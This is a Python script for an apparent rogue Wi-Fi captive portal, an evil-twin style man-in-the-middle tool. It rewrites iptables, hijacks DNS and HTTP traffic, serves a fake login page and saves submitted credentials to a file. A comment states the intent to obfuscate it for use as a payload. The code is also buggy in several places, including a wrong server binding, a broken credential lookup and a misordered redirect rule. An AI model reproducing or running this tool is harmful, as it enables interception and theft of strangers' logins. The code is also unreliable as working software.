#!/usr/bin/python3
#I had to make a decision at some point to python3
#in the interest of the future , i choose python3
#need to update the names in whatever portal you are using
# Working on obfuscating the everloving shit out of this and using it as a payload.
import subprocess
from http.server import HTTPServer as Webserver
import http.server
#try:
#    from urllib.parse import urlparse
#except ImportError:
#    from urlparse import urlparse
try:
    import SocketServer as socketserver
except ImportError:
    import socketserver as socketserver
import ipaddress
import colorama
from colorama import init
init()
from colorama import Fore, Back, Style
def blueprint(text):
    print(Fore.BLUE + ' ' +  text + ' ' + Style.RESET_ALL)
def greenprint(text):
    print(Fore.GREEN + ' ' +  text + ' ' + Style.RESET_ALL)
def redprint(text):
    print(Fore.RED + ' ' +  text + ' ' + Style.RESET_ALL)
import cgitb
import cgi
import os
import re
# These variables are used as settings
#set to your appropriate ifaces
moniface,iface='eth0','eth1'
PORT=9090         # the port in which the captive portal web server listens
IFACE="wlan2"      # the interface that captive portal protects
IP_ADDRESS="192.168.0.1" # the ip address of the captive portal (it can be the IP of IFACE)
filename='credentials.txt'
global remote_IP
hostlist , networkaddrpool = [] , []
i1name, i2name,i3name  = 'username' , 'email' , 'submit'
portalpage = '/portal/login.php.html'
credentials = [[ 'nikos' , 'fotiou'] , # please keep this here at least commented, its to cite them.
                ['user1' , 'password'],
                ['user2' , 'password2'],
                ['hacker' , 'root']]
def serveportal():
    httpd = http.server.HTTPServer((ipaddress, PORT), CaptivePortal)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
class CaptivePortal(http.server.SimpleHTTPRequestHandler):
    #this is the index of the captive portal
    #it simply redirects the user to the to login page
    html_redirect = """
    <html>
    <head>
        <meta http-equiv="refresh" content="0; url=http://{0}{1}{2}" />
    </head>
    <body>
        <b>Redirecting to MITM hoasted captive portal page</b>
    </body>
    </html>
    """.format(IP_ADDRESS, PORT, portalpage)
    html_login = """
    <!DOCTYPE html>
    <html>
    <head>
    <meta charset="utf-8" />
    <title></title>
    </head>
    <body>
    <form class="login" action="do_POST" method="post">
    <input type="text" name="username" value="username">
    <input type="text" name="password" value="password">
    <input type="submit" name="submit" value="submit">
    </form>
    </body>
    </html>
    """

    def authpassthrough():
        redprint('Updating IP tables to allow {0} through'.format(remote_IP))
        subprocess.call(["iptables","-t", "nat", "-I", "PREROUTING","1", "-s", remote_IP, "-j" ,"ACCEPT"])
        subprocess.call(["iptables", "-I", "FORWARD", "-s", remote_IP, "-j" ,"ACCEPT"])

    def authenticate(self, username, password):
        for username_password in credentials:
            if username_password[0][0] == username and credentials[username_password[0][0]] == password:
                remote_IP = self.client_address[0]
                greenprint('New authorization from '+ remote_IP)
                greenprint('adding to address pool')
                networkaddrpool.append(remote_IP)
                self.wfile.write("You are now hacker authorized. Navigate to any URL")
                authpassthrough()
            else:
                self.wfile.write(self.html_login)


    def savecredentials(self, filename):
        remote_IP = self.client_address[0]
        hostlist.append(remote_IP)
        formdata = cgi.FieldStorage()
        try:
            with open(filename, 'ab') as filehandle:
                input1 = formdata.getvalue(i1name)
                input2 = formdata.getvalue(i2name)
                input3 = formdata.getvalue(i3name)
                filehandle.write(formdata.getvalue(i1name))
                filehandle.write('\n')
                filehandle.write(formdata.getvalue(i2name))
                filehandle.write('\n\n')
                filehandle.close()
        except Exception as e:
            raise
        subprocess.call(["iptables","-t", "nat", "-I", "PREROUTING","1", "-s", remote_IP, "-j" ,"ACCEPT"])
        subprocess.call(["iptables", "-I", "FORWARD", "-s", remote_IP, "-j" ,"ACCEPT"])
        self.wfile.write("You are now authorized. Navigate to any URL")

    def do_GET(self):
        path = self.path
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        if path == "/":
            self.wfile.write(self.html_login)
        else:
            #we are using an external file instead of a local variable
            self.wfile.write(self.html_redirect)

    def do_POST(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD':'POST',
                     'CONTENT_TYPE':self.headers['Content-Type'],
                     })
        username = form.getvalue("username")
        password = form.getvalue("password")
        authenticate(username,password)

    #the following function makes server produce no output
    #comment it out if you want to print diagnostic messages
    #def log_message(self, format, *args):
    #    return


def EstablishMITMnetwork():
    os.popen("ip link set {0} down".format(iface))
    os.popen("ip addr add {0} dev {1}".format(IP_ADDRESS, iface))
    try:
        p = subprocess.check_output(["iwconfig", moniface,  "mode", "monitor"], stderr=subprocess.PIPE)
        greenprint("[+] Monitor Mode Enabled")
    except subprocess.CalledProcessError as e:
        redprint("[-] Failed to set monitor mode")
    else:
        greenprint("[+] Monitor Mode Enabled")
    os.popen("ip link set {0} up".format(iface))
    greenprint("[+]Clearing IP Tables Rulesets")
    os.popen("iptables -w 3 --flush")
    os.popen("iptables -w 3 --table nat --flush")
    os.popen("iptables -w 3 --delete-chain")
    os.popen("iptables -w 3 --table nat --delete-chain")
    greenprint("[+]enable ip Forwarding")
    os.popen("echo 1 > /proc/sys/net/ipv4/ip_forward")
    greenprint("[+]Setup a NAT environment")
    os.popen("iptables -w 3 --table nat --append POSTROUTING --out-interface {0} -j MASQUERADE".format(iface))
    greenprint("[+]allow incomming from the outside on the monitor iface")
    os.popen("iptables -w 3 --append FORWARD --in-interface {0} -j ACCEPT".format(moniface))
    greenprint("[+]allow UDP DNS resolution inside the NAT  via prerouting")
    os.popen("iptables -w 3 -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to " + IP_ADDRESS)
    greenprint("[+]Allow Loopback Connections")
    os.popen("iptables -w 3 -A INPUT -i lo -j ACCEPT")
    os.popen("iptables -w 3 -A OUTPUT -o lo -j ACCEPT")
    greenprint("[+]Allow Established and Related Incoming Connections")
    os.popen("iptables -w 3 -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT")
    greenprint("[+]Allow Established Outgoing Connections")
    os.popen("iptables -w 3 -A OUTPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT")
    greenprint("[+]Internal to External")
    os.popen("iptables -w 3 -A FORWARD -i {0} -o {1} -j ACCEPT".format(moniface, iface))
    greenprint("[+]Drop Invalid Packets")
    os.popen("iptables -w 3 -A INPUT -m conntrack --ctstate INVALID -j DROP")
    subprocess.call(["iptables", "-w", "3", "-A", "FORWARD", "-i", IFACE, "-p", "tcp", "--dport", "53", "-j" ,"ACCEPT"])
    subprocess.call(["iptables", "-w", "3", "-A", "FORWARD", "-i", IFACE, "-p", "udp", "--dport", "53", "-j" ,"ACCEPT"])
    redprint(".. Allow traffic to captive portal")
    subprocess.call(["iptables", "-w", "3", "-A", "FORWARD", "-i", IFACE, "-p", "tcp", "--dport", str(PORT),"-d", IP_ADDRESS, "-j" ,"ACCEPT"])
    redprint(".. Block all other traffic")
    subprocess.call(["iptables", "-w", "3", "-A", "FORWARD", "-i", IFACE, "-j" ,"DROP"])
    ###################################################
    #
    #       HERE IS WHERE THE WERVER IS STARTED
    #
    #
    ###################################################
    greenprint("Starting web server")
    serveportal()
    greenprint("Redirecting HTTP traffic to captive portal")
    subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", IFACE, "-p", "tcp", "--dport", "80", "-j" ,"DNAT", "--to-destination", IP_ADDRESS+":"+str(PORT)])




EstablishMITMnetwork()
CaptivePortal()
